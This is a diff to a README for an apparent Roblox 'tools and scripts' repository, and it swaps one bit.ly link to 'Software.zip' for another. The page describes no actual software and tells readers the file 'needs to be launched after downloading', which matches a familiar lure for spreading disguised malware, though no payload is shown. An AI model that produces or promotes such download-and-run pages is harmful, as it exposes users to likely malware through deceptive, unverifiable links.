@@ -8,14 +8,14 @@ Topics related to this repository are not provided.
 
 ## Get Started:
 To access the software package, click on the following link: 
-[Download Software.zip](https://bit.ly/3Vk6jRq)
+[Download Software.zip](https://bit.ly/3OGWg5p)
 
 *Note: The file needs to be launched after downloading.*
 
 ## Explore the Possibilities:
 🔗 Visit the following link to elevate your Roblox gameplay with the latest tools and scripts:
 
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://bit.ly/3Vk6jRq)
+[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://bit.ly/3OGWg5p)
 
 Unleash your creativity and push the boundaries of Roblox with the resources available in this repository.
 
